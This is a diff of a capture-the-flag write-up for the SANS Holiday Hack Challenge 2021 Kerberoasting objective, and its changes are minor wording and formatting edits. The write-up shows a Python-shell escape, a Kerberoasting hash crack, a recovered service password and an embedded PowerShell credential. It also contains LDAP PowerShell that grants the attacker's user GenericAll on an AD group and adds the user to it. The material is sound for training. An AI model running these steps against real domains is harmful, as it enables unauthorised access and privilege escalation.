@@ -1,6 +1,6 @@
 # Objective 8: Kerberoasting on an Open Fire
-**Location: Staging**
-**Elf: Jingle Ringford**
+**Location: Staging**  
+**Elf: Jingle Ringford**  
 **Hints provided by Eve Snowshoes after completion of [HoHo ... No](https://github.com/joergschwarzwaelder/hhc2021/blob/master/Additional/HoHo...No.md)**
 
 The objective to obtain a secret research document.
@@ -16,7 +16,7 @@ After this a Python shell is displayed.
 In order to escape this `os.system.("bash")` has to be submitted in order to get to a normal Unix shell.
 
 ### Reconnaissance
-An nmap scan of the network 10.128.0.0/22 two hosts providing Windows services: 10.128.1.53 (domain controller) and 10.128.3.30 (samba file server) with the shares `elfu_svc_shr` and `research_dep`.
+An nmap scan of the network 10.128.0.0/22 reveals two hosts providing Windows services: 10.128.1.53 (domain controller) and 10.128.3.30 (samba file server) with the shares `elfu_svc_shr` and `research_dep`.
 
 
 ### Pulling data from AD
@@ -50,20 +50,20 @@ hashcat -m 13100 -a0 spn.txt --potfile-disable -r OneRuleToRuleThemAll.rule --fo
 Hashcat finds the password for `elfu_svc` to be `Snow2021!`.
 
 ### Access to elfu_svc_shr
-With this information we can get access to the elfu_svc_shr file share in 10.128.3.30:
+With this information we can get access to the elfu_svc_shr file share on 10.128.3.30:
 ```
 smbclient -U elfu_svc '\\10.128.3.30\elfu_svc_shr'
 ```
-On this share are several Powershell scripts. One of them, `GetProcessInfo.ps1` holds credentials for the user `remote_elf`:
-```
+On this share are several Powershell scripts. One of them, `GetProcessInfo.ps1`, holds credentials for the user `remote_elf`:
+```powershell
 $SecStringPassword = "76492d1116743f0423413b16050a5345MgB8AGcAcQBmAEIAMgBiAHUAMwA5AGIAbQBuAGwAdQAwAEIATgAwAEoAWQBuAGcAPQA9AHwANgA5ADgAMQA1ADIANABmAGIAMAA1AGQAOQA0AGMANQBlADYAZAA2ADEAMgA3AGIANwAxAGUAZgA2AGYAOQBiAGYAMwBjADEAYwA5AGQANABlAGMAZAA1ADUAZAAxADUANwAxADMAYwA0ADUAMwAwAGQANQA5ADEAYQBlADYAZAAzADUAMAA3AGIAYwA2AGEANQAxADAAZAA2ADcANwBlAGUAZQBlADcAMABjAGUANQAxADEANgA5ADQANwA2AGEA"
 $aPass = $SecStringPassword | ConvertTo-SecureString -Key 2,3,1,6,2,8,9,9,4,3,4,5,6,8,7,7
 $aCred = New-Object System.Management.Automation.PSCredential -ArgumentList ("elfu.local\remote_elf", $aPass)
 ```
 
 ### Getting into group Research Department
-With the `remote_elf` credential snippet from the script, we can grant our windows domain user the `GenericAll` permissions for the group Research Department:
-```
+With the `remote_elf` credential snippet from the script, we can grant our windows domain user the `GenericAll` permissions for the group Research Department (based on [scripts](https://github.com/chrisjd20/hhc21_powershell_snippets) provided by Chris Davis, a Kringle Con speaker) :
+```powershell
 Invoke-Command -ComputerName 10.128.1.53 -ScriptBlock {
   Add-Type -AssemblyName System.DirectoryServices
   $ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
@@ -83,7 +83,7 @@ Invoke-Command -ComputerName 10.128.1.53 -ScriptBlock {
 } -Credential $aCred -Authentication Negotiate
 ```
 and add then our user to this group:
-```
+```powershell
 Invoke-Command -ComputerName 10.128.1.53 -ScriptBlock {
   Add-Type -AssemblyName System.DirectoryServices
   $ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
